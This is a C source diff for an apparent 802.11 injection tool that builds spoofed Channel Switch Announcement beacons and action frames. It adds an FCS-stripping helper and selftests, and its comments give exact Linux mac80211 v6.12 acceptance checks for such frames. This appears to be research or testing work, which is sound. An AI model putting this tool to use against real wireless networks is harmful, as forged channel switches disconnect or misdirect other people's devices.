@@ -128,6 +128,31 @@ static int rtap_parse(const uint8_t *buf, size_t len, int *fcs)
     return (int)it_len;
 }
 
+/* Strip radiotap and any trailing FCS from one captured frame.  Sets *body to the start of the
+ * 802.11 frame and returns its length, or 0 if the capture is unusable.
+ *
+ * This is a separate pure function on purpose, because it carries the precondition that
+ * csa_frame_build() documents but **cannot check**: by the time the builder sees a frame, radiotap
+ * is gone and there is no flag left to read.  If the FCS is not removed here, the appended element
+ * lands *after* it and every receiver discards the frame -- silently.  Leaving that as an implicit
+ * sequence inside capture_beacon() made the invariant untestable, which a review caught; it is a
+ * function with its own selftest cases now. */
+static size_t strip_capture(const uint8_t *buf, size_t len, const uint8_t **body)
+{
+    int fcs = 0;
+    int rl = rtap_parse(buf, len, &fcs);
+    if (rl < 0 || (size_t)rl >= len)
+        return 0;
+    size_t flen = len - (size_t)rl;
+    if (fcs) {
+        if (flen < 4)
+            return 0;
+        flen -= 4;
+    }
+    *body = buf + rl;
+    return flen;
+}
+
 /* ------------------------------------------------------------- 802.11 layout */
 
 #define FC_MGMT_BEACON_0 0x80    /* type 0 (mgmt), subtype 8 (beacon) */
@@ -147,9 +172,23 @@ static int rtap_parse(const uint8_t *buf, size_t len, int *fcs)
 #define FC_MGMT_ACTION_0 0xd0   /* type 0 (mgmt), subtype 13 (action) */
 #define WLAN_ACTION_SPECTRUM_MGMT    0
 #define WLAN_ACTION_SPCT_CHL_SWITCH  4
-/* ieee80211.h: IEEE80211_MIN_ACTION_SIZE = offsetof(ieee80211_mgmt, u.action.u) = 24 + 1.
- * rx612.c gates on skb->len >= IEEE80211_MIN_ACTION_SIZE + sizeof(u.action.u.chan_switch),
- * i.e. >= 26.  Our frame is 24 + 1 + 1 + 5 = 31, so it clears the gate with margin. */
+/* The receive path gates on
+ *   skb->len >= IEEE80211_MIN_ACTION_SIZE + sizeof(u.action.u.chan_switch)
+ * and 26 is the answer.  An earlier note here derived that from the consuming code's internal
+ * consistency, because the project's scratchpad copy of ieee80211.h disagreed with the rx612.c
+ * beside it.  It is now computed directly from upstream v6.12's own
+ * include/linux/ieee80211.h, which settles it without the inference:
+ *
+ *   offsetof(struct ieee80211_mgmt, u.action.category)              = 24   (the mgmt header)
+ *   IEEE80211_MIN_ACTION_SIZE = offsetof(..., u.action.u)           = 25
+ *   sizeof(u.action.u.chan_switch)  { u8 action_code; u8 variable[]; }  = 1
+ *   => gate                                                         = 26
+ *   offsetof(..., u.action.u.chan_switch.variable)                  = 26   (first element byte)
+ *
+ * Our frame is 24 + 1 (category) + 1 (action code) + 5 (CSA element) = 31, clearing it by 5.
+ * Keep the header-provenance warning in mind if these are ever re-derived: an offset taken from
+ * the wrong tree fails as a silent drop, which is the failure mode this experiment cannot afford.
+ * [V] against v6.12. */
 #define MIN_ACTION_SIZE 25
 #define ACTION_CHAN_SWITCH_MIN (MIN_ACTION_SIZE + 1)
 
@@ -486,6 +525,65 @@ static int selftest(void)
     st("nonce frame: rejects an undersized output buffer",
        nonce_frame_build("PAGERINJ-a1b2c3d4", 52, buf, 16) == 0);
 
+    /* --- the element lengths csa_present() demands EXACTLY ---
+     *
+     * mlme.c:8328 accepts an element only on `datalen == sizeof(*csa)` / `== sizeof(*ecsa)` --
+     * equality, not >=.  Verified against include/linux/ieee80211.h at v6.12:
+     *   struct ieee80211_channel_sw_ie  { mode, new_ch_num, count }                        = 3
+     *   struct ieee80211_ext_chansw_ie  { mode, new_operating_class, new_ch_num, count }    = 4
+     * A one-byte drift either way makes the element invisible with no diagnostic anywhere, so the
+     * constants are pinned here rather than left to a future edit. */
+    st("csa ie: payload length is exactly 3 (sizeof ieee80211_channel_sw_ie)", CSA_IE_LEN == 3);
+    st("ecsa ie: payload length is exactly 4 (sizeof ieee80211_ext_chansw_ie)", ECSA_IE_LEN == 4);
+    st("ecsa ie: field order is mode, opclass, ch, count",
+       want_ecsa[2] == 1 && want_ecsa[3] == 118 && want_ecsa[4] == 52 && want_ecsa[5] == 3);
+
+    /* --- strip_capture(): the precondition csa_frame_build() cannot check itself ---
+     *
+     * A review noted that csa_frame_build() appends at in_len with no FCS handling, which is
+     * correct ONLY if the capture was already shortened -- and that the old selftest implied that
+     * without asserting it.  These cases assert it. */
+    {
+        /* a capture carrying radiotap WITH the FCS flag, the beacon, and 4 trailing FCS bytes */
+        uint8_t cap[8 + sizeof FIX_BEACON + 4];
+        const uint8_t rt_f[] = { 0x00,0x00, 0x09,0x00, 0x02,0x00,0x00,0x00, RT_FLAG_FCS };
+        uint8_t cap2[sizeof rt_f + sizeof FIX_BEACON + 4];
+        memcpy(cap2, rt_f, sizeof rt_f);
+        memcpy(cap2 + sizeof rt_f, FIX_BEACON, sizeof FIX_BEACON);
+        memset(cap2 + sizeof rt_f + sizeof FIX_BEACON, 0xde, 4);   /* bogus trailing FCS */
+
+        const uint8_t *body = NULL;
+        size_t bl = strip_capture(cap2, sizeof cap2, &body);
+        st("strip: FCS flag set -> 4 trailing bytes removed", bl == sizeof FIX_BEACON);
+        st("strip: body starts after radiotap", body == cap2 + sizeof rt_f);
+        st("strip: body is the beacon, unmodified", bl && st_eqmem(body, FIX_BEACON, bl));
+
+        /* THE ASSERTION THE REVIEW ASKED FOR: build from the stripped capture and confirm the CSA
+         * element sits immediately after the beacon's last real IE, not after the FCS. */
+        size_t fn = csa_frame_build(body, bl, 1, 52, 3, -1, 0, buf, sizeof buf);
+        st("strip+build: CSA element directly follows the last IE, not the FCS",
+           fn == RTAP_TX_LEN + sizeof FIX_BEACON + 5 &&
+           buf[RTAP_TX_LEN + sizeof FIX_BEACON] == EID_CSA);
+        st("strip+build: no 0xde FCS byte survives into the frame",
+           fn && memchr(buf, 0xde, fn) == NULL);
+
+        /* and the negative: without the flag, nothing is stripped */
+        const uint8_t rt_n[] = { 0x00,0x00, 0x08,0x00, 0x00,0x00,0x00,0x00 };
+        memcpy(cap, rt_n, sizeof rt_n);
+        memcpy(cap + sizeof rt_n, FIX_BEACON, sizeof FIX_BEACON);
+        body = NULL;
+        bl = strip_capture(cap, sizeof rt_n + sizeof FIX_BEACON, &body);
+        st("strip: no FCS flag -> nothing removed", bl == sizeof FIX_BEACON);
+
+        /* a frame too short to hold the FCS it claims */
+        const uint8_t runt[] = { 0x00,0x00, 0x09,0x00, 0x02,0x00,0x00,0x00, RT_FLAG_FCS, 1, 2 };
+        body = NULL;
+        st("strip: rejects a frame too short for its claimed FCS",
+           strip_capture(runt, sizeof runt, &body) == 0);
+        st("strip: rejects a bad radiotap header",
+           strip_capture((const uint8_t[]){ 0x01,0x00,0x08,0x00,0,0,0,0 }, 8, &body) == 0);
+    }
+
     /* --- radiotap parsing, including the FCS trap --- */
     int fcs = 99;
     const uint8_t rt_plain[] = { 0x00,0x00, 0x08,0x00, 0x00,0x00,0x00,0x00 };
@@ -549,13 +647,9 @@ static size_t capture_beacon(int fd, const uint8_t *bssid, int timeout_s,
     while (time(NULL) < deadline) {
         ssize_t n = recv(fd, buf, sizeof buf, MSG_DONTWAIT);
         if (n <= 0) { struct timespec ts = {0, 2000000}; nanosleep(&ts, NULL); continue; }
-        int fcs = 0;
-        int rl = rtap_parse(buf, (size_t)n, &fcs);
-        if (rl < 0 || (size_t)rl >= (size_t)n) continue;
-        const uint8_t *f = buf + rl;
-        size_t flen = (size_t)n - (size_t)rl;
-        if (fcs) { if (flen < 4) continue; flen -= 4; }
-        if (flen < IE_START) continue;
+        const uint8_t *f = NULL;
+        size_t flen = strip_capture(buf, (size_t)n, &f);
+        if (!flen || flen < IE_START) continue;
         if (f[0] != FC_MGMT_BEACON_0 || (f[1] & 0x0c) != 0x00) continue;
         if (memcmp(f + 16, bssid, 6) != 0) continue;
         if (flen > out_cap) continue;
@@ -643,13 +737,24 @@ int main(int argc, char **argv)
     if (rate < 1) rate = 1;
     if (mode < 0 || mode > 255) { usage(); return 2; }
     if (ecsa_count >= 0) {
-        /* Not defaulted, but the reason is narrower than it first looked.  csa_present()
-         * (mac80211_mlme.c:8328) reads only datalen, count, mode and new_ch_num -- it never reads
-         * the operating class -- so the DENIAL arm fires whatever this byte says.  And on the move
-         * path a bad class does not abort either: spectmgmt.c zeroes new_op_class and falls back to
-         * element 37.  So a wrong value degrades the move arm rather than silently killing either.
-         * Still required explicitly: read it off the target rather than guess, because a guess that
-         * happens to parse is worse than one that does not. */
+        /* Not defaulted, and the reason is narrower than this comment first claimed.  Both halves
+         * below re-read at upstream v6.12 rather than inherited: csa_present() (mlme.c:8328) takes
+         * only datalen, count, mode and new_ch_num and never touches the operating class, so the
+         * DENIAL arm fires whatever this byte says; and on the move path a bad class does not abort
+         * either -- spectmgmt.c:259 zeroes new_op_class and :272 falls back to element 37.  [V]
+         *
+         * One sharper consequence of that fallback, which matters to the third arm specifically.
+         * The fallback does not merely lose the class, it takes element 37's **count**:
+         *
+         *     if (!new_op_class && elems->ch_switch_ie) {
+         *             new_chan_no   = elems->ch_switch_ie->new_ch_num;
+         *             csa_ie->count = elems->ch_switch_ie->count;      <-- 0, in the third arm
+         *
+         * so with --count 0 --ecsa-count 3 the operating class decides *which element's count the
+         * move path uses*: good class -> the eCSA's 3 (delayed switch, element 37 never read);
+         * bad class -> element 37's 0 (immediate switch).  The denial arm is unaffected either way.
+         * That is the real reason to read the value off the target instead of guessing -- a guess
+         * that happens to parse silently changes what the move arm measures. */
         if (!do_csa || ecsa_count > 255 || ecsa_opclass < 0 || ecsa_opclass > 255) {
             fprintf(stderr, "--ecsa-count needs --csa and an explicit --ecsa-opclass\n");
             usage(); return 2;
@@ -664,6 +769,21 @@ int main(int argc, char **argv)
     }
     if (do_nonce && (chan <= 0 || chan > 255))
         chan = 1;   /* only cosmetic for the nonce beacon's DS element */
+
+    /* csa_present() carries a SECOND per-element discard that is easy to walk into, and that
+     * neither this file nor the docs mentioned until it was read at v6.12 (mlme.c:8350, and the
+     * same pair for the eCSA):
+     *
+     *     if (csa && !csa->mode && csa->new_ch_num == cur_channel)   csa = NULL;
+     *
+     * So mode 0 announcing the channel the target is already on is discarded -- silently, and
+     * before the count is ever considered.  pineapd hardcodes mode 1 and so do we by default, but
+     * --mode 0 is reachable from the command line and the tool cannot check the second half of the
+     * condition because it deliberately never reads the current channel. */
+    if ((do_csa || do_action) && mode == 0)
+        fprintf(stderr, "warning: --mode 0 is discarded outright by csa_present() if --chan %d is "
+                        "the channel the target is already on (mlme.c:8350). pineapd uses mode 1.\n",
+                chan);
 
     int ifindex = 0;
     int fd = open_mon(ifname, &ifindex);
